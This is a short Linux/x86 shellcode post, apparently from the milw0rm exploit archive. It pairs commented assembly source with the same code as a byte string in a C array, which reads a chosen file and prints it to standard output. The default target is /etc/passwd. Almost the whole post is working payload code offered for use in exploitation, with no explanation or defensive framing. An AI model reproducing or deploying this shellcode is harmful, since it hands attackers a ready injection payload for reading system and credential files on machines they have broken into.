/*
Linux/x86 file reader.

65 bytes + pathname
Author: certaindeath

Source code:
_start:
	xor	%eax, %eax
	xor	%ebx, %ebx
	xor	%ecx, %ecx
	xor	%edx, %edx
	jmp	two

one:
	pop	%ebx

	movb	$5, %al
	xor	%ecx, %ecx
	int	$0x80

	mov	%eax, %esi
	jmp	read

exit:
	movb	$1, %al
	xor	%ebx, %ebx
	int	$0x80

read:
	mov	%esi, %ebx
	movb	$3, %al
	sub	$1, %esp
	lea	(%esp), %ecx
	movb	$1, %dl
	int	$0x80

	xor	%ebx, %ebx
	cmp	%eax, %ebx
	je	exit

	movb	$4, %al
	movb	$1, %bl
	movb	$1, %dl
	int	$0x80

	add	$1, %esp
	jmp	read

two:
	call	one
	.string	"file_name"
*/
char main[]=
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
"\xeb\x32\x5b\xb0\x05\x31\xc9\xcd"
"\x80\x89\xc6\xeb\x06\xb0\x01\x31"
"\xdb\xcd\x80\x89\xf3\xb0\x03\x83"
"\xec\x01\x8d\x0c\x24\xb2\x01\xcd"
"\x80\x31\xdb\x39\xc3\x74\xe6\xb0"
"\x04\xb3\x01\xb2\x01\xcd\x80\x83"
"\xc4\x01\xeb\xdf\xe8\xc9\xff\xff"
"\xff"
"/etc/passwd"; //Put here the file path, default is /etc/passwd

// milw0rm.com [2009-02-27]